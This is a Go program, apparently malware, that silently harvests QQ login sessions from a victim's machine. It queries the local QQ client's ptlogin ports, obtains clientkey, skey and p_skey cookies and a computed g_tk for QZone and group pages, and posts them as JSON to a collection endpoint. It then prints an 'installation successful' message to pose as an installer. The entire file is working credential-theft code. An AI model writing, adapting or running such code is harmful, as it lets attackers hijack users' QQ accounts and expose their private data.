package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

type User struct {
	Title string 	`json:"title"`
	Account string `json:"account"`
	Nickname string `json:"nickname"`
	PtLocalToken string `json:"pt_local_token"`
	Uin string `json:"uin"`
	Skey string `json:"skey"`
	PSkey string `json:"p_skey"`
	GTK int `json:"g_tk"`
}

const (
	// qq空间
	qzoneReferer  = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&daid=5&&hide_title_bar=1&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&appid=549000912&style=22&target=self&s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&pt_qr_link=http%3A//z.qzone.com/download.html&self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&pt_qr_help_link=http%3A//z.qzone.com/download.html&pt_no_auth=1"
	qzoneTargetUrl = "https://qzs.qzone.qq.com/qzone/v5/loginsucc.html"

	// qq好友
	friendReferer  = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=715030901&daid=73&hide_close_icon=1&pt_no_auth=1&s_url=https%3A%2F%2Fqun.qq.com%2Fmember.html%23gid%3D11186560"
	friendTargetUrl = "https://qun.qq.com/member.html"
)

func main() {

	getInfo(qzoneReferer,qzoneTargetUrl,"QZone")

	getInfo(friendReferer,friendTargetUrl,"Friends")

	fmt.Println("安装成功!")

}

func getInfo(referer, targetUrl,title string)  {
	var user = User{}
	user.Title = title
	client := http.Client{}
	req,_ := http.NewRequest("GET","https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url="+targetUrl+"&style=20&appid=715021417&proxy_url=https%3A%2F%2Fhuifu.qq.com%2Fproxy.html",nil)
	response, err := client.Do(req)
	if err != nil{
		fmt.Printf("第一次请求失败：status:%s, err:%s \n",response.Status,err.Error())
	}
	ptLocalToken := processStr(response.Header["Set-Cookie"],"pt_local_token")
	user.PtLocalToken = ptLocalToken
	// 2.获取本机所登陆的QQ号码
	flag := false
	for i:=0; i<8; i++ {
		req,_ = http.NewRequest("GET",fmt.Sprintf("https://localhost.ptlogin2.qq.com:430%d/pt_get_uins?callback=ptui_getuins_CB&r=0.6694805047494219&pt_local_tk=%s",i,ptLocalToken),nil)
		req.Header.Set("cookie",fmt.Sprintf("pt_local_token=%s",ptLocalToken))
		req.Header.Set("referer",referer)
		res,err := client.Do(req)
		if err != nil || res==nil {
			//fmt.Printf("端口430%d 无法连接\n",i)
			continue
		} else {
			bytes, _ := ioutil.ReadAll(res.Body)
			body := string(bytes)
			r := regexp.MustCompile("\\[.*?]")
			temp := string(r.Find([]byte(body)))
			temp = temp[1:len(temp)-1]
			json.Unmarshal([]byte(temp),&user)
			flag = true
			break
		}
	}
	if !flag {
		return
	}
	// 3. 获取clientkey
	req, _ = http.NewRequest("GET", fmt.Sprintf("https://localhost.ptlogin2.qq.com:4301/pt_get_st?clientuin=%s&callback=ptui_getst_CB&r=0.7284667321181328&pt_local_tk=%s", user.Account, ptLocalToken), nil)
	req.Header.Set("cookie",fmt.Sprintf("pt_local_token=%s",ptLocalToken))
	req.Header.Set("referer",referer)
	res, err := client.Do(req)
	if err != nil{
		fmt.Printf("第三次请求失败：status:%s, err:%s \n",res.Status,err.Error())
	}
	clientkey := processStr(res.Header["Set-Cookie"],"clientkey")

	// 4. 获取skey
	url := "https://ptlogin2.qq.com/jump?clientuin="+user.Account+"&keyindex=9&pt_aid=549000912&daid=5&u1="+targetUrl+"%3Fpara%3Dizone&pt_local_tk="+ptLocalToken+"&pt_3rd_aid=0&ptopt=1&style=40&has_onekey=1"
	req, _ = http.NewRequest("GET",  url,nil)
	req.Header.Set("cookie",fmt.Sprintf("pt_local_token=%s;clientuin=%s;clientkey=%s",ptLocalToken,user.Account,clientkey))
	req.Header.Set("referer",referer)

	res, err = client.Do(req)
	if err != nil{
		fmt.Printf("第四次请求失败：status:%s, err:%s \n",res.Status,err.Error())
	}
	// 获取uin和skey
	uin := processStr(res.Header["Set-Cookie"],"uin")
	skey := processStr(res.Header["Set-Cookie"],"skey")
	user.Uin = uin
	user.Skey = skey
	// 获取返回的URL
	all, _:= ioutil.ReadAll(res.Body)
	temp := string(all)
	r := regexp.MustCompile("https(.*?)'")
	temp = string(r.Find([]byte(temp)))
	url = temp[0:len(temp)-1]

	// 5. 根据第四步返回的URL，获取p_skey
	req, _ = http.NewRequest("GET", url, nil)
	req.Header.Set("cookie",fmt.Sprintf("pt_local_token=%s",ptLocalToken))
	req.Header.Set("referer",referer)
	res, err = client.Do(req)
	if err != nil {
		fmt.Printf("第五次请求失败：status:%s, err:%s \n",res.Status,err.Error())
	}
	pSkey := processStr(res.Request.Response.Header["Set-Cookie"],"p_skey")
	user.PSkey = pSkey
	user.GTK = genderGTK(skey)

	//fmt.Printf("%+v \n",user)
	bytes, _ := json.Marshal(user)
	sendURL(string(bytes))
}

// 根据key匹配数组中的值
func processStr(maps []string, key string)string{
	keyTemp := key+"="
	for _,v := range maps{
		if strings.Contains(v,keyTemp) && strings.Index(v,key) < 3 {
			r := regexp.MustCompile(keyTemp+"(.*?);")
			temp := string(r.Find([]byte(v)))
			temp = strings.Replace(temp,keyTemp,"",1)
			value := temp[0:len(temp)-1]
			return value
		}
	}
	return ""
}
// 根据skey计算出g_tk
func genderGTK(skey string) int {
	hash := 5381
	len := len(skey)
	for i:=0; i < len; i++ {
		hash += (hash << 5) + int(skey[i])
	}
	return hash & 0x7fffffff
}

func sendURL(data string)  {
	_, err := http.PostForm("http://127.0.0.1:9500/qzone",url.Values{"data": {data}})
	if err!=nil {
		fmt.Println("记录信息失败:"+err.Error())
	}
}